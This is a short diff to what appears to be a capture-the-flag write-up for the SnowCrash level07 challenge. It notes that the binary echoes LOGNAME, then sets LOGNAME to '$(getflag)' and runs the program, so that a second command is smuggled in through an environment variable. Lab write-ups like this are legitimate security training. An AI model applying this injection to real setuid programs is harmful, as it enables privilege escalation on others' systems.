@@ -1,3 +1,4 @@
+strings level07, we see /bin/echo %s, and just before LOGNAME
 level07@SnowCrash:~$ export LOGNAME='$(getflag)'
 level07@SnowCrash:~$ 
 level07@SnowCrash:~$ ./level07 lol
